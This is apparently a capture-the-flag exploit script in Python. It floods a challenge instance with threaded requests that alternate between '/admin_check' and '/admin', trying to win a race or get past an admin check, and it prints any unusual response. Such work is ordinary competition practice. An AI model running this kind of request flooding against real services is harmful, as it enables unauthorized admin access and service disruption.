import _thread


url = "https://inst-7051cacd9c6e0fad-proxies.chal.crewc.tf/"


def req(part):
    import requests

    resp = requests.get(url+part)

    #print(resp.text,part)
    _filter = ["OK", "Error contacting admin service"]
    if not any([x == resp.text for x in _filter]):
        print(mod, resp.text)
2


if __name__ == "__main__":
    import time
    for i in range(100000):

        mod = i
        print(mod)
        for j in range(30):
            part = "/admin_check" if (i+j)%2==0 else "/admin"

            _thread.start_new_thread(req, (part,))
        time.sleep(3)

    time.sleep(100)